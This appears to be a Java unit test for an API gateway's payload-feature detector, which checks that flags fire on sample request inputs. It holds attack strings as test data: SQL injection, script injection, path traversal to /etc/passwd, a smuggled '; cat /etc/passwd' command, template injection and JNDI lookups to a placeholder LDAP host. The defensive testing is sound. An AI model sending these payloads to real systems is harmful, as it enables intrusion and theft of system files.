package com.apisecurity.gateway.features;

import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class PayloadFeaturesTest {

    @Test
    public void structuralFlagsMatchThePythonFormulas() {
        expect("", "", "", "", "", 0, 0, 0, 0, 0, 0, 0);
        expect("", "search=protocol", "", "", "", 0, 0, 0, 0, 0, 0, 0);
        expect("", "ref=a+b;c", "", "", "", 0, 0, 0, 0, 0, 0, 0);
        expect("", "q=%27%20OR%20%271%27=%271", "", "", "", 1, 0, 0, 0, 0, 0, 0);
        expect("", "q=select%20*%20from%20books--", "", "", "", 1, 0, 0, 0, 0, 0, 0);
        expect("", "", "<script>alert(1)</script>", "", "", 0, 1, 0, 0, 0, 0, 0);
        expect("/api/books/..%2Fetc%2Fpasswd", "", "", "", "", 0, 0, 1, 0, 0, 0, 0);
        expect("", "search=;%20cat%20/etc/passwd", "", "", "", 0, 0, 0, 1, 0, 0, 0);
        expect("/greet/%7B%7B7*7%7D%7D", "", "", "", "", 0, 0, 0, 1, 0, 0, 0);
        expect("/forum", "", "", "Mozilla/5.0", "", 0, 0, 0, 0, 0, 0, 0);
        expect("/forum", "message=%3Cscript%3Ealert()%3C%2Fscript%3E", "", "", "", 0, 1, 0, 0, 0, 0, 0);
        expect("/cookie", "", "", "", "", 0, 0, 0, 0, 1, 0, 0);
        expect("", "", "", "", "admin=true", 0, 0, 0, 0, 1, 0, 0);
        expect("", "q=a%0Ab", "", "", "", 0, 0, 0, 0, 0, 1, 0);
        expect("", "", "${jndi:ldap://example/a}", "", "", 0, 0, 0, 0, 0, 0, 1);
        expect("", "q=%24%7Bjndi%3Aldap", "", "", "", 0, 0, 0, 0, 0, 0, 1);
        expectHeaders(List.of("${jndi:ldap://example/a}"), null, 0, 0, 0, 0, 0, 0, 1);
        expectHeaders(null, List.of("${jndi:ldap://example/a}"), 0, 0, 0, 0, 0, 0, 1);
        expectHeaders(null, List.of("<script>alert(1)</script>"), 0, 1, 0, 0, 0, 0, 0);
        expectHeaders(List.of("../etc/passwd"), null, 0, 0, 1, 0, 0, 0, 0);
        expectHeaders(null, List.of("ck=1; Domain=example.com/How-To-Select-a-Surgeon---Part-1.html"), 0, 0, 0, 0, 0, 0, 0);
        expectHeaders(List.of("ck=1; Domain=example.com/How-To-Select-a-Surgeon---Part-1.html"), null, 1, 0, 0, 0, 0, 0, 0);
    }

    private static void expect(String path, String query, String body, String userAgent, String cookie,
                               int sql, int markup, int traversal, int command, int cookieSignal, int log, int jndi) {
        Map<String, Integer> actual = PayloadFeatures.extract(path, query, body, userAgent, null, cookie);
        assertEquals(sql, actual.get("sql_structure"));
        assertEquals(markup, actual.get("markup_script"));
        assertEquals(traversal, actual.get("path_traversal"));
        assertEquals(command, actual.get("command_chain"));
        assertEquals(cookieSignal, actual.get("cookie_signal"));
        assertEquals(log, actual.get("log_control"));
        assertEquals(jndi, actual.get("jndi_lookup"));
    }

    private static void expectHeaders(List<String> headerValues, List<String> lookupHeaderValues,
                                      int sql, int markup, int traversal, int command, int cookieSignal, int log, int jndi) {
        Map<String, Integer> actual = PayloadFeatures.extract("", "", "", "", headerValues, "", lookupHeaderValues);
        assertEquals(sql, actual.get("sql_structure"));
        assertEquals(markup, actual.get("markup_script"));
        assertEquals(traversal, actual.get("path_traversal"));
        assertEquals(command, actual.get("command_chain"));
        assertEquals(cookieSignal, actual.get("cookie_signal"));
        assertEquals(log, actual.get("log_control"));
        assertEquals(jndi, actual.get("jndi_lookup"));
    }
}
